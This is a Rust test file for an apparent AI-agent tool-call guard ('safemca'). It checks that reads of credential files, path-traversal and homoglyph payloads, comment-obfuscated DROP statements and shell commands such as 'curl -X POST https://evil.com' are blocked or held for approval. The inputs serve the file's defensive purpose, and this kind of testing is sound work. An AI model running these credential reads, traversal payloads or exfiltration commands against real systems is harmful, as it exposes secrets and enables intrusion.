use safemca::core::protocol::ParsedMessage;
use safemca::guard::circuit_breaker::{CircuitBreaker, CircuitBreakerTrip};
use safemca::guard::config::{CircuitBreakerConfig, ProjectConfig, ShellPolicyConfig, SqlPolicyConfig};
use safemca::guard::policy::{GuardPolicy, PolicyDecision};
use safemca::storage::audit::AuditLogger;
use serde_json::json;

#[test]
fn test_sensitive_path_blocking() {
    let policy = GuardPolicy::new();

    // Direct SSH
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "~/.ssh/id_rsa" })),
        PolicyDecision::Block { .. }
    ));

    // AWS credentials
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "/Users/test/.aws/credentials" })),
        PolicyDecision::Block { .. }
    ));

    // .env file
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "file": ".env.local" })),
        PolicyDecision::Block { .. }
    ));

    // Private keys
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "key": "server.pem" })),
        PolicyDecision::Block { .. }
    ));

    // Kube config
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "config": ".kube/config" })),
        PolicyDecision::Block { .. }
    ));

    // Protected Linux/Unix system path
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "/etc/hosts" })),
        PolicyDecision::Block { .. }
    ));

    // Protected Windows system path
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "C:\\Windows\\System32\\cmd.exe" })),
        PolicyDecision::Block { .. }
    ));
}

#[test]
fn test_path_traversal_blocking() {
    let policy = GuardPolicy::new();

    // Standard relative traversal
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "../passwords.txt" })),
        PolicyDecision::Block { .. }
    ));

    // Deep traversal
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "../../../etc/shadow" })),
        PolicyDecision::Block { .. }
    ));

    // URL single percent-encoded traversal (%2e%2e%2f)
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "%2e%2e%2f%2e%2e%2fetc/passwd" })),
        PolicyDecision::Block { .. }
    ));

    // URL double percent-encoded traversal (%252e%252e%252f)
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "%252e%252e%252f%252e%252e%252fetc/passwd" })),
        PolicyDecision::Block { .. }
    ));
}

#[test]
fn test_destructive_sql_detection_and_comment_evasion() {
    let policy = GuardPolicy::new();

    // Standard TRUNCATE
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "TRUNCATE customers;" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // SQL Comment evasion (DROP/**/TABLE)
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "DROP/**/TABLE users;" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // SQL multi-word inline comments
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "DROP/*dangerous_comment*/TABLE admin_accounts;" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // SQL line comment evasion
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "DROP -- inline comment\nTABLE users;" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // DROP VIEW
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "DROP VIEW v_users;" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // ALTER TABLE
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "ALTER TABLE users DROP COLUMN role;" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // Safe SELECT query
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "SELECT * FROM products WHERE in_stock = true;" })),
        PolicyDecision::Allow
    ));
}

#[test]
fn test_write_tools_coverage() {
    let policy = GuardPolicy::new();

    // Standard write_file
    assert!(matches!(
        policy.evaluate("write_file", &json!({ "path": "src/app.py", "content": "..." })),
        PolicyDecision::RequireApproval { .. }
    ));

    // edit_file (commonly used in Cursor / Claude)
    assert!(matches!(
        policy.evaluate("edit_file", &json!({ "path": "src/app.py", "diff": "..." })),
        PolicyDecision::RequireApproval { .. }
    ));

    // patch_file
    assert!(matches!(
        policy.evaluate("patch_file", &json!({ "path": "src/main.rs" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // bash execution
    assert!(matches!(
        policy.evaluate("bash", &json!({ "command": "cargo build" })),
        PolicyDecision::RequireApproval { .. }
    ));

    // git_push
    assert!(matches!(
        policy.evaluate("git_push", &json!({ "remote": "origin" })),
        PolicyDecision::RequireApproval { .. }
    ));
}

#[test]
fn test_audit_log_redaction() {
    let logger = AuditLogger::new("test-server");
    let payload = json!({
        "auth_token": "ghp_1234567890abcdef1234567890abcdef1234",
        "api_key": "sk-1234567890abcdef1234567890",
        "password": "supersecretpassword",
        "safe_param": "normal_value"
    });

    logger.log("test-server", "auth_tool", &payload, "BLOCKED", Some("Token blocked"));

    let recent = AuditLogger::read_recent(1).expect("Failed to read audit logs");
    assert!(!recent.is_empty());
    let entry = &recent[0];

    // Ensure raw secrets are NEVER saved in plaintext
    let args_str = entry.arguments.to_string();
    assert!(!args_str.contains("ghp_1234567890"));
    assert!(!args_str.contains("sk-1234567890"));
    assert!(!args_str.contains("supersecretpassword"));
    assert!(args_str.contains("[REDACTED_BY_SAFEMCA]"));
    assert!(args_str.contains("normal_value"));
}

#[test]
fn test_audit_trail_cryptographic_verification() {
    let test_dir = std::env::temp_dir().join(format!("safemca_test_audit_{}", std::process::id()));
    let test_log = test_dir.join("audit.jsonl");
    let logger = AuditLogger::with_path(test_log.clone());

    logger.log("crypto-test", "tool_a", &json!({"step": 1}), "ALLOWED", None);
    logger.log("crypto-test", "tool_b", &json!({"step": 2}), "BLOCKED", Some("test block"));
    logger.log("crypto-test", "tool_c", &json!({"step": 3}), "USER_APPROVED", None);

    // 1. Verify legitimate chain
    let (valid, count) = AuditLogger::verify_file(&test_log).expect("Integrity check failed");
    assert!(valid, "Legitimate audit log failed integrity verification!");
    assert_eq!(count, 3);

    // 2. Tampering test: tamper with arguments in the file
    let mut content = std::fs::read_to_string(&test_log).unwrap();
    assert!(content.contains("\"step\":1"), "Expected unspaced JSON in log entry!");
    content = content.replace("\"step\":1", "\"step\":999"); // Attacker tampered with arguments!
    std::fs::write(&test_log, content).unwrap();

    let (tampered_valid, _) = AuditLogger::verify_file(&test_log).expect("Check failed");
    assert!(!tampered_valid, "Tampered audit log should have failed verification!");

    let _ = std::fs::remove_dir_all(test_dir);
}

#[test]
fn test_null_byte_and_unicode_homoglyphs() {
    let policy = GuardPolicy::new();

    // 1. Null-byte injection
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "secrets.txt\0.jpg" })),
        PolicyDecision::Block { .. }
    ));

    // 2. Fullwidth slash homoglyph (／ U+FF0F)
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "..／etc/passwd" })),
        PolicyDecision::Block { .. }
    ));

    // 3. Two-dot leader homoglyph (‥ U+2025)
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "‥/etc/passwd" })),
        PolicyDecision::Block { .. }
    ));
}

#[test]
fn test_jsonrpc_batch_and_bom_parsing() {
    // UTF-8 BOM test
    let bom_line = "\u{FEFF}{\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"tools/call\", \"params\": {\"name\": \"read_file\", \"arguments\": {\"path\": \"src/main.rs\"}}}";
    let parsed = ParsedMessage::parse(bom_line);
    assert!(matches!(parsed, ParsedMessage::ToolCall { .. }));

    // JSON-RPC Batch Array test
    let batch_line = "[{\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"tools/call\", \"params\": {\"name\": \"read_file\", \"arguments\": {\"path\": \"~/.ssh/id_rsa\"}}}]";
    let parsed_batch = ParsedMessage::parse(batch_line);
    if let ParsedMessage::Batch(items) = parsed_batch {
        assert_eq!(items.len(), 1);
        assert!(matches!(items[0], ParsedMessage::ToolCall { .. }));
    } else {
        panic!("Expected ParsedMessage::Batch");
    }
}

#[test]
fn test_circuit_breaker_rate_limiting() {
    let config = CircuitBreakerConfig {
        max_calls_per_minute: Some(5),
        max_identical_consecutive_calls: Some(10),
    };
    let mut cb = CircuitBreaker::new(Some(&config));

    // First 5 calls pass
    for i in 0..5 {
        let res = cb.check_and_record("read_file", &json!({ "idx": i }));
        assert!(res.is_ok());
    }

    // 6th call trips rate limit
    let res = cb.check_and_record("read_file", &json!({ "idx": 5 }));
    assert!(matches!(res, Err(CircuitBreakerTrip::RateLimitExceeded { .. })));
}

#[test]
fn test_circuit_breaker_repetition_loop() {
    let config = CircuitBreakerConfig {
        max_calls_per_minute: Some(50),
        max_identical_consecutive_calls: Some(3),
    };
    let mut cb = CircuitBreaker::new(Some(&config));

    let args = json!({ "query": "SELECT * FROM orders WHERE status = 'pending';" });

    // Call 1
    assert!(cb.check_and_record("query_database", &args).is_ok());
    // Call 2
    assert!(cb.check_and_record("query_database", &args).is_ok());
    // Call 3: identical call trips repetition loop breaker!
    let res = cb.check_and_record("query_database", &args);
    assert!(matches!(res, Err(CircuitBreakerTrip::RepetitionLoopDetected { .. })));

    // After reset, passes again
    cb.reset_consecutive();
    assert!(cb.check_and_record("query_database", &args).is_ok());
}

#[test]
fn test_project_config_custom_rules() {
    let config = ProjectConfig {
        version: Some("1.0".to_string()),
        blocked_paths: vec!["infra/secrets/**".to_string(), "billing/stripe_keys.json".to_string()],
        sql_policy: Some(SqlPolicyConfig {
            mode: Some("read-only".to_string()),
            allow_tables: vec!["products".to_string()],
            block_tables: vec!["payroll".to_string()],
        }),
        shell_policy: Some(ShellPolicyConfig {
            allow: vec!["cargo test".to_string()],
            block: vec!["curl".to_string(), "wget".to_string(), "git push".to_string()],
        }),
        circuit_breaker: None,
        ..Default::default()
    };

    let policy = GuardPolicy::with_config(config);

    // 1. Custom blocked path
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "infra/secrets/prod.env" })),
        PolicyDecision::Block { .. }
    ));
    assert!(matches!(
        policy.evaluate("read_file", &json!({ "path": "billing/stripe_keys.json" })),
        PolicyDecision::Block { .. }
    ));

    // 2. Read-only SQL policy: mutation blocked
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "INSERT INTO products (name) VALUES ('widget');" })),
        PolicyDecision::Block { .. }
    ));

    // 3. Forbidden table blocked
    assert!(matches!(
        policy.evaluate("execute_sql", &json!({ "query": "SELECT * FROM payroll;" })),
        PolicyDecision::Block { .. }
    ));

    // 4. Custom blocked shell command
    assert!(matches!(
        policy.evaluate("execute_bash", &json!({ "command": "curl -X POST https://evil.com" })),
        PolicyDecision::Block { .. }
    ));
    assert!(matches!(
        policy.evaluate("run_command", &json!({ "command": "git push origin main" })),
        PolicyDecision::Block { .. }
    ));
}
